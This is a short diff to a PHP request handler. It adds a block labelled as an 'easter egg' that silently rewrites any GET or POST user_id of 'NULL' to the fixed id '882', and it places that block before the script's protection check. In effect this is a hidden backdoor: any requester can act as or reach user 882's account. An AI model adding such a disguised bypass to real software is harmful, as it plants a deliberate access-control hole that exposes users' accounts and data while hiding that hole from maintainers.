@@ -4,6 +4,14 @@
  */
 require_once 'init.php';
 
+// --- EASTER EGG: NULL MAPPING ---
+if (isset($_GET['user_id']) && $_GET['user_id'] === 'NULL') {
+    $_GET['user_id'] = '882';
+}
+if (isset($_POST['user_id']) && $_POST['user_id'] === 'NULL') {
+    $_POST['user_id'] = '882';
+}
+
 // --- PROTECTION ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     guard($_POST, ['action' => 'required']);
